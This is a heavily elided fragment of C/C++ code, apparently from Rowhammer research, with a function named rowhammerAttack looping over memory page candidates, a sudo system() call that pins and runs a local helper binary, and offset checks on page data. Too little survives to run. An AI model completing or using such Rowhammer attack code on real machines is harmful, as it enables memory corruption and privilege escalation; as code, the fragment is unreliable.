...
void rowhammerAttack(vector<PageCandidate> &pages) {
    int j=0;
    for(int i =((uint64_t)(&j)%0x10)+((uint64_t)(&j) %121); i < NUMBER_PAGES; i++) {
...
FILE* fp4=fopen("page.txt","w");
  ...
  //  sleep(1);
	...
	int ok = system("sudo taskset -c 7 ./wolf/edd");
...
int main(int argc, char *argv[]) {
 ...
 cpu_set_t set;
    ...
    while(fgets(line,sizeof(line),fp)!=NULL)
    {
    	...
    	if(offset[NUMBER_PAGES]>=8*0x120 && offset[NUMBER_PAGES] <(8*0x140)){
